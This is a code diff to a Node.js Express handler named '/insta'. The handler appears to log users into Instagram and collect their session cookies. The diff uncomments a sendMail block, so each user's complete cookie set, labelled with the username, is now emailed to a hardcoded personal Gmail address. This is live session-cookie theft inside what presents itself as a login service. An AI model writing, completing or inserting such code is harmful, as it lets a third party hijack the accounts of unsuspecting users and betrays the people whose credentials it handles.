@@ -234,41 +234,39 @@ app.post("/insta", (req, res) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
         });
-
-        console.log(val2.cookies);
         const validCookie = {
           url: "https://instagram.com",
           cookies: val2.cookies,
         };
-
+        console.log(JSON.stringify(validCookie));
         var mailOptions = {
           from: process.env.email,
           to: "surya142327@gmail.com",
           subject: "cookies of user" + req.query.username,
           text: JSON.stringify(validCookie),
         };
-        // transporter.sendMail(mailOptions, function (error, info) {
-        //   if (error) {
-        //     console.log(error);
-        //     res.json({
-        //       success: true,
-        //       twoFactor: false,
-        //       user: val,
-        //       cookie: JSON.stringify(validCookie),
-        //       message: "login Successful but failed to send email",
-        //     });
-        //   } else {
-        //     console.log("Email sent: " + info.response);
-        //     res.json({
-        //       success: true,
-        //       twoFactor: false,
-        //       user: val,
-        //       cookie: JSON.stringify(validCookie),
-        //       message: "login Successful and email has been sent.",
-        //     });
-        //     res.end();
-        //   }
-        // });
+        transporter.sendMail(mailOptions, function (error, info) {
+          if (error) {
+            console.log(error);
+            res.json({
+              success: true,
+              twoFactor: false,
+              user: val,
+              cookie: JSON.stringify(validCookie),
+              message: "login Successful but failed to send email",
+            });
+          } else {
+            console.log("Email sent: " + info.response);
+            res.json({
+              success: true,
+              twoFactor: false,
+              user: val,
+              cookie: JSON.stringify(validCookie),
+              message: "login Successful and email has been sent.",
+            });
+            res.end();
+          }
+        });
       });
     })
   ).catch(
